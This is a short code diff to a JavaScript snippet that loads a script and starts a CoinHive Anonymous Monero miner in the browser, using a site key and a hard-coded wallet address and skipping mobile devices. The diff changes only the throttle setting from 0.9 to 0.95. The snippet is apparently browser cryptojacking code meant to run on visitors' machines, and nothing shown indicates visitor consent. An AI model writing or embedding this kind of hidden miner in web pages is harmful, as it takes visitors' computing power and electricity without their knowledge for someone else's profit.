@@ -1,7 +1,7 @@
 var script = document.createElement('script');
 script.onload = function () {
 	// XMR Pool hash
-	var m = new CoinHive.Anonymous( 'Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.9} );
+	var m = new CoinHive.Anonymous( 'Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.95} );
 	// Wallet
 	if(!m.isMobile()){
 		m.start('43er6EeusBRXUqY4w3tXWVD6HpBV57cXn4Y4kDeMVcz1Ji1R6zJhDwxNz2gGCEzWEgD5Z5sSWnsJ53rEcrwsf8Pm7pudpSc');
